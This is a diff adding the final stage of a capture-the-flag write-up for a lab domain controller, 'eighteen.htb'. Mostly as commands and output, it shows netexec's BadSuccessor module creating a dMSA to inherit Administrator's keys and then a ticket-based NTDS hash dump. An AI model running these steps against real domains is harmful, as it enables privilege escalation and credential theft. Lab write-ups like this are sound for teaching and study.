@@ -168,3 +168,36 @@ To verify that the machine was vulnerable to `BadSuccessor`, a PowerShell script
 <img width="345" height="52" alt="image" src="https://github.com/user-attachments/assets/5e0642f8-f3f4-48bd-879f-5801af260742" />
 
 `Chisel` was uploaded and connectivity was verified. Afterward, the clock was synchronized with the target.
+
+```
+proxychains netexec ldap dc01.eighteen.htb -u adam.scott -p 'iloveyou1' -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=roy TARGET_ACCOUNT=Administrator
+LDAP        224.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert) 
+LDAP        224.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
+BADSUCCE... 224.0.0.1       389    DC01             [+] Found DC with Windows Server 2025: 224.0.0.2 (DC01.eighteen.htb)
+BADSUCCE... 224.0.0.1       389    DC01             [+] dMSA 'roy$' created at CN=roy,OU=Staff,DC=eighteen,DC=htb
+BADSUCCE... 224.0.0.1       389    DC01             DNS Hostname: roy.eighteen.htb
+BADSUCCE... 224.0.0.1       389    DC01             Migration state: 2 (completed)
+BADSUCCE... 224.0.0.1       389    DC01             Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
+BADSUCCE... 224.0.0.1       389    DC01             [+] Current keys:
+BADSUCCE... 224.0.0.1       389    DC01             EncryptionTypes.aes256_cts_hmac_sha1_96: c23d2ee88cca21b1fed4a801e00f20a7318a8adb85d1cd08f8e2fc1fc94f3d5e
+BADSUCCE... 224.0.0.1       389    DC01             EncryptionTypes.aes128_cts_hmac_sha1_96: 1f03e9cbb9e5672970560496c285ffb4
+BADSUCCE... 224.0.0.1       389    DC01             EncryptionTypes.rc4_hmac: dad23aa0e8e234df8a524f58d065e3fc
+BADSUCCE... 224.0.0.1       389    DC01             [+] Previous keys:
+BADSUCCE... 224.0.0.1       389    DC01             EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec
+BADSUCCE... 224.0.0.1       389    DC01             [+] Service ticket saved to roy$.ccache
+```
+
+The exploit was then run, which generated a TGT for the `roy` account.
+
+```
+KRB5CCNAME=roy\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds
+SMB         dc01.eighteen.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.eighteen.htb 445    DC01             [+] eighteen.htb\roy$ from ccache (Pwn3d!)
+SMB         dc01.eighteen.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc01.eighteen.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+...
+```
+<img width="814" height="360" alt="image" src="https://github.com/user-attachments/assets/dff7af19-4336-4dfd-a3fc-d6349f3f960f" />
+
+
+The ticket was used to dump domain hashes. Authenticating with the `Administrator` hash then granted access, and the `root flag` was obtained.
